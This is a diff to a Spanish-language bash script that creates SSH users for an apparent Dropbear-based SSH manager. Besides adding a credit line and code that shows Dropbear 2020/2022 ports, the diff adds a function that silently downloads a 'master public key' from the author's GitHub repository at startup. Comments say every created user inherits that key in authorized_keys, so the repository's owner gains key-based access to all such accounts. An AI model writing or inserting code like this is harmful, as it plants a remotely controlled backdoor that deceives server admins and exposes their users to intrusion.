@@ -1,5 +1,7 @@
 #!/bin/bash
 # ============================================================
+# * Creado y modificado por t:me/JuanitoProSniif
+# ============================================================
 # CREAR USUARIO SSH — SSHMSY MANAGER
 # Sin OpenVPN / Sin OpenSSH directo — usa Dropbear 2016
 #
@@ -16,12 +18,30 @@ cor1='\033[41;1;37m'
 cor2='\033[44;1;37m'
 scor='\033[0m'
 
+_REPO_BASE="https://raw.githubusercontent.com/juanitoprosniff/scriptsshmsy/main"
+
 # Ruta de la clave maestra compartida (todos los usuarios la heredan)
 MASTER_PUBKEY="/etc/SSHPlus/master_pubkey.pub"
 
 # FIX Dropbear 2016: registrar /bin/false y nologin en /etc/shells
 grep -qx '/bin/false' /etc/shells 2>/dev/null || echo '/bin/false' >> /etc/shells
 grep -qx '/usr/sbin/nologin' /etc/shells 2>/dev/null || echo '/usr/sbin/nologin' >> /etc/shells
+
+# ── Descarga automática de la clave maestra si no existe ─────
+# Si la key no está en disco, la baja desde GitHub silenciosamente.
+# Así el admin no tiene que recordar descargarla a mano.
+_auto_descargar_master_key() {
+    [[ -f "$MASTER_PUBKEY" && -s "$MASTER_PUBKEY" ]] && return
+    mkdir -p /etc/SSHPlus
+    wget -q --timeout=20 \
+        "${_REPO_BASE}/Modulos/master_pubkey.pub" \
+        -O "$MASTER_PUBKEY" 2>/dev/null
+    if [[ -s "$MASTER_PUBKEY" ]]; then
+        chmod 644 "$MASTER_PUBKEY"
+    else
+        rm -f "$MASTER_PUBKEY"
+    fi
+}
 
 # ── Función: instalar authorized_keys para un usuario ────────
 # Crea ~/.ssh/authorized_keys con la clave maestra. El shell sigue
@@ -77,6 +97,16 @@ fun_show_ports() {
     [[ -z "$_db16_port" ]] && \
         _db16_port=$(screen -list 2>/dev/null | grep 'dropbear2016' | grep -oP '\d+(?=\.dropbear2016)' | head -1)
     [[ -n "$_db16_port" ]] && echo -e "\033[1;32mDropbear2016:\033[1;37m $_db16_port\033[0m"
+
+    systemctl is-active dropbear-2020 >/dev/null 2>&1 && {
+        _db20_port=$(systemctl show dropbear-2020 --property=ExecStart 2>/dev/null | grep -oP '(?<=-p )\d+' | head -1)
+        [[ -n "$_db20_port" ]] && echo -e "\033[1;32mDropbear2020:\033[1;37m $_db20_port\033[0m"
+    }
+
+    systemctl is-active dropbear-2022 >/dev/null 2>&1 && {
+        _db22_port=$(systemctl show dropbear-2022 --property=ExecStart 2>/dev/null | grep -oP '(?<=-p )\d+' | head -1)
+        [[ -n "$_db22_port" ]] && echo -e "\033[1;32mDropbear2022:\033[1;37m $_db22_port\033[0m"
+    }
 
     _py_ports=$(ss -tlpn 2>/dev/null | grep -E 'python|python3' | awk '{print $4}' | rev | cut -d: -f1 | rev | sort -u | xargs)
     [[ -n "$_py_ports" ]] && echo -e "\033[1;32mProxy WS    :\033[1;37m $_py_ports\033[0m"
@@ -183,6 +213,9 @@ fun_usertoken() {
 
 # ── Verificar que el sistema esté instalado ───────────────────
 [[ ! -e /usr/lib/sshplus ]] && exit 0
+
+# Intentar descargar la key automáticamente si no existe
+_auto_descargar_master_key
 
 clear
 echo -e "\033[0;34m╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\033[0m"
